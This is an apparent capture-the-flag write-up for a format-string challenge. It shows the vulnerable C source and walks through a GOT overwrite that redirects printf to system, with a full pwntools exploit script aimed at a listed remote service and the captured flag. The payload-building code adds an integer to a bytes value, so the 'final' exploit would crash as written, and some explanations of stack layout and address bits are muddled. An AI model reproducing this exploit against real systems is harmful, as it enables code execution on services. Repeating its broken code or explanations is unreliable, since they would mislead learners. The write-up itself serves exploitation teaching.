# Medium-Format String — Writeup

## Challenge Summary

| | |
|---|---|
| **Name** | Medium-Format String |
| **Category** | pwn |
| **Points** | 200 |
| **Topic** | Format string → GOT overwrite |
| **Binary** | `fsb_got` (non-PIE, Partial RELRO) |
| **Provided files** | `fsb_got`, `fsb_got.c`, `libc.so.6` |
| **Service** | `47.83.170.192:32814` |
| **Goal** | Get a shell and `cat flag.txt` |

## The Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define LINE_MAX 0x100

void prepare(void)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(120);
}

int main(void)
{
    char line[LINE_MAX];

    prepare();
    puts("== echo server ==");

    for (int i = 0; i < 3; i++) {
        write(STDOUT_FILENO, "say something: ", 15);
        read(STDIN_FILENO, line, LINE_MAX);
        printf(line);              // <-- format-string bug
        write(STDOUT_FILENO, "\n", 1);
    }

    return 0;
}
```

Two things to notice:

1. `printf(line)` — user input is passed straight to `printf` as the format string. Classic FSB.
2. Exactly **three** iterations of the loop. That's the whole plan: leak → overwrite → trigger.

`checksec fsb_got` shows **No PIE** (so `elf.got[...]` is a fixed address) and **Partial RELRO** (so the GOT is writable). That means GOT overwrite is the intended path.

## The Plan

```
loop 1  →  leak printf@GOT      (compute libc base → system address)
loop 2  →  overwrite printf@GOT with system
loop 3  →  printf(line) is now system(line) — send a command
```

Three turns, three steps. That's why the loop is capped at three.

## Step 0 — Find the Stack Offset

The first 8 bytes of `line[]` are placed on the stack as the return-address frame for `printf`. In a 64-bit System V ABI this means the *first 8 bytes of our buffer appear as `printf`'s 6th variadic argument*, so `%6$p` leaks them.

Confirm with a quick probe:

```
sendline(b"AAAA.%p.%p.%p.%p.%p.%p.%p")
```

The output will show `AAAA` echoed back as the 6th `%p`, e.g.:

```
AAAA.0x....0x....0x....0x....0x41414141.0x70252e70...
```

So **offset 6** is where our buffer starts.

**Reading the GOT with `%s`:** we need a pointer in the buffer. If we place the address in the *first 8 bytes*, it lands at arg 6, and `%6$s` would try to dereference the bytes of the format string itself — wrong. The clean trick is to prepend **exactly 8 bytes of format text**, then the address, so the address lands at arg 7 and we use `%7$s`:

```
payload = b"%7$sAAAA" + p64(elf.got["printf"])
```

The 8 bytes `"%7$sAAAA"` occupy the first qword (args 6's slot), and `p64(printf@GOT)` occupies args 7's slot. `%7$s` then reads the bytes at `printf@GOT` — the runtime address of `printf`.

## Step 1 — Leak `printf@GOT`

```python
from pwn import *

context.binary = elf = ELF("./fsb_got", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = remote("47.83.170.192", 32814)

p.recvuntil(b"say something: ")
p.sendline(b"%7$sAAAA" + p64(elf.got["printf"]))
printf_leak = u64(p.recvuntil(b"AAAA")[:-4].ljust(8, b"\x00"))
```

`recvuntil(b"AAAA")` delimits the leaked pointer from the trailing sentinel, and `ljust(8, b"\x00")` pads the high bytes in case glibc stopped copying at a NUL (it usually doesn't here, but be safe).

Then:

```python
libc.address = printf_leak - libc.sym["printf"]
system_addr  = libc.sym["system"]          # absolute, do NOT add libc.address
```

**Key gotcha:** after setting `libc.address = X`, pwntools rebases `libc.sym[...]` to `X + offset` — absolute. Adding `libc.address` again double-counts and gives absurd values like `0xf984c4430d70`. This was the first real bug in the exploit.

Sanity check:

```python
assert (printf_leak >> 32) == (system_addr >> 32)
```

`printf` and `system` live in the same libc, so their top 32 bits (the page-aligned part) always match. If that assert fails, the libc file is wrong.

## Step 2 — Overwrite `printf@GOT` with `system`

### Why not `fmtstr_payload(6, {printf@GOT: system})`?

Two reasons:

1. **The `0x0000` edge case.** A canonical libc `system` looks like `0x00007f...`; the top two bytes are `0x0000`. `fmtstr_payload(..., write_size="short")` tries to write that `0x0000` via a `%hn`, requiring a printf count of exactly `0 mod 65536` at that specifier. pwntools pads with a huge `%<n>c` and, on some versions, the count never aligns — printf churns, output backs up on an unbuffered TCP socket, Nagle adds latency, and either the client times out or `alarm(120)` kills the process. Result: “freeze”.

2. **The bytes probably don't need touching.** In practice the top 4 bytes of `printf` and `system` are identical (same libc page region). So we only need to rewrite bytes 0..3.

### The real approach — direct `%hhn`s, not `%hn`s

Even after narrowing to two `%hn`s, our first attempt emitted ~64880 bytes (`%29587c%35293c`) which is still slow enough to hang on an unbuffered socket. Switching to `%hhn` per differing byte drops the total to ~253 bytes and shortens the payload.

For a leak like

```
printf = 0x735f7394f6f0
system = 0x735f7393fd70
```

the differing bytes are:

| index | printf | system | GOT offset |
|-------|--------|--------|------------|
| 0     | `0xf0` | `0x70` | `got+0`    |
| 1     | `0xf6` | `0xfd` | `got+1`    |
| 2     | `0x94` | `0x93` | `got+2`    |
| 3     | `0x73` | `0x73` | unchanged  |

Only bytes 0–2 differ. Write them **in ascending target-value order** so each `%<n>c` delta is non-negative:

```
write 0x70 -> got+0   (112 bytes emitted)
write 0x93 -> got+2   (35 more, total 147)
write 0xfd -> got+1   (106 more, total 253)
```

### Constructing the payload

The format string must come first (so the argument indexes on the stack line up), and the target addresses follow, 8-byte aligned. The argument index of the first address = `6 + len(fmt_and_pad)/8`.

Because the padding changes `len(fmt)`, and `len(fmt)` depends on which arg indexes we use, we iterate to a fixed point:

```python
changes = []                                    # (value, byte_offset)
for i in range(4):
    old = (printf_leak >> (8*i)) & 0xff
    new = (system_addr  >> (8*i)) & 0xff
    if old != new:
        changes.append((new, i))
changes.sort()

N   = len(changes)
idx = list(range(11, 11 + N))                   # initial guess
for _ in range(10):
    parts, prev = [], 0
    for (val, off), i in zip(changes, idx):
        parts.append(f"%{val-prev}c%{i}$hhn".encode())
        prev = val
    fmt = b"".join(parts)
    pad = b"A" * ((8 - len(fmt) % 8) % 8)
    total = len(fmt) + pad
    nidx = list(range(6 + total // 8, 6 + total // 8 + N))
    if nidx == idx:
        break
    idx = nidx

parts, prev = [], 0
for (val, off), i in zip(changes, idx):
    parts.append(f"%{val-prev}c%{i}$hhn".encode())
    prev = val
fmt = b"".join(parts)
pad = b"A" * ((8 - len(fmt) % 8) % 8)
addresses = b"".join(p64(got + off) for _, off in changes)
payload2 = fmt + pad + addresses
```

Now send and advance:

```python
p.recvuntil(b"say something: ")
p.sendline(payload2)
```

## Step 3 — Trigger `system`

Third loop iteration: `printf(line)` dispatches to the overwritten GOT entry, so `printf(line)` *is* `system(line)`.

```python
p.recvuntil(b"say something: ")
p.sendline(b"cat flag.txt")
```

Because the argument is `system`'s shell-command, `cat flag.txt` runs and the flag comes back on stdout.

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *
import time

context.binary = elf = ELF("./fsb_got", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = remote("47.83.170.192", 32814)

# ---- stage 1: leak printf@GOT ----
p.recvuntil(b"say something: ")
p.sendline(b"%7$sAAAA" + p64(elf.got["printf"]))
printf_leak = u64(p.recvuntil(b"AAAA")[:-4].ljust(8, b"\x00"))

libc.address = printf_leak - libc.sym["printf"]
system_addr  = libc.sym["system"]           # absolute

log.success(f"printf = {printf_leak:#x}")
log.success(f"libc   = {libc.address:#x}")
log.success(f"system = {system_addr:#x}")
assert (printf_leak >> 32) == (system_addr >> 32)

got = elf.got["printf"]

# ---- stage 2: build %hhn chain ----
changes = []
for i in range(4):
    old = (printf_leak >> (8*i)) & 0xff
    new = (system_addr  >> (8*i)) & 0xff
    if old != new:
        changes.append((new, i))
changes.sort()
log.info(f"changes = {[(hex(v), o) for v, o in changes]}")

N   = len(changes)
idx = list(range(11, 11 + N))
for _ in range(10):
    parts, prev = [], 0
    for (val, off), i in zip(changes, idx):
        parts.append(f"%{val-prev}c%{i}$hhn".encode())
        prev = val
    fmt = b"".join(parts)
    pad = b"A" * ((8 - len(fmt) % 8) % 8)
    total = len(fmt) + pad
    nidx = list(range(6 + total // 8, 6 + total // 8 + N))
    if nidx == idx:
        break
    idx = nidx

parts, prev = [], 0
for (val, off), i in zip(changes, idx):
    parts.append(f"%{val-prev}c%{i}$hhn".encode())
    prev = val
fmt = b"".join(parts)
pad = b"A" * ((8 - len(fmt) % 8) % 8)
payload2 = fmt + pad + b"".join(p64(got + off) for _, off in changes)

log.info(f"payload2 ({len(payload2)}b) fmt = {fmt.decode()}")
assert len(payload2) < 0x100
assert b"\x00" not in fmt + pad

p.recvuntil(b"say something: ")
p.sendline(payload2)

# ---- stage 3: printf@GOT == system, third call ----
p.recvuntil(b"say something: ")
p.sendline(b"cat flag.txt")

time.sleep(1)
print(p.recvrepeat(2).decode(errors="replace"))
p.close()
```

## Bugs and Dead Ends I Hit

Documenting these because they cost real time:

### 1. `fmtstr_payload(..., write_size="short")` hangs

`fmtstr_payload` tries to write the top two bytes of `system` as `0x0000` via `%hn`. On some pwntools versions the `%<n>c` padding count is off-by-a-few and the `%hn` never fires. Because `stdout` is unbuffered, printf churns out hundreds of KB one small `write()` at a time, the socket backs up on Nagle, and everything stalls — either client-side or because the server's `alarm(120)` reaps the process.

**Fix:** do the writes by hand, and use `%hhn` per differing byte. Output drops from ~64880 to ~253 bytes.

### 2. Double-counting `libc.address`

```python
libc.address = printf_leak - libc.sym["printf"]
system_addr  = libc.address + libc.sym["system"]   # WRONG
```

After `libc.address` is set, `libc.sym["system"]` is already absolute. Adding `libc.address` gives nonsense like `0xf984c4430d70` and the `assert (printf_leak >> 32) == (system_addr >> 32)` fails.

**Fix:**

```python
system_addr = libc.sym["system"]
```

### 3. Using two `%hn`s instead of three `%hhn`s

Even after fixing the double-count, `%29587c%35293c` still generates ~64 KB of output. Fine in a local `socat` setup, fatal over a remote TCP socket with `_IONBF` stdout. Three `%hhn`s keeps the output tiny and the payload short.

### 4. Reading a `%s` leak correctly

`%7$s` stops at the first NUL byte and returns a variable-length blob. The convention is to bound it with a known sentinel (`AAAA`) and use `recvuntil`. Make sure the sentinel isn't part of the address bytes — that's why the format text is exactly 8 bytes, not more.

## Takeaways

- **Three iterations = three turns.** Read the source literally — the loop cap is a hint about the intended chain length:
    - Turn 1: [printf@GOT] still points at real printf → we use it to leak.
    - Turn 2: our payload executes inside real printf and rewrites [printf@GOT] to system's address. The call itself returns cleanly.
    - Turn 3: printf(line) now reads the tampered GOT slot → jumps to system → line becomes the argument to system, i.e. a shell command.
- **Use `%s` on the GOT for a leak when you have a real pointer already on the stack.** No need for a `%p` sweep once you know the offset.
- **`fmtstr_payload` is not always your friend.** The `0x0000` short-write edge case, combined with `_IONBF` stdout, can silently hang. Build minimal `%hhn` chains by hand for GOT overwrites — it's a few lines of code and orders of magnitude faster.
- **`libc.address` semantics matter.** After setting `libc.address`, `libc.sym[...]` returns the absolute address. Get this wrong once and you'll chase ghosts in your `assert`.
- **Ascending write order is mandatory.** `%hhn` writes require the printf character count to grow monotonically; sort the target values before generating the format string.

The flag is in `flag.txt` in the working directory of the service — `cat flag.txt` via the hijacked `system` reads it back over the socket.

## Flag
`flag{ictf_fsb_a78b6f52fa0a}`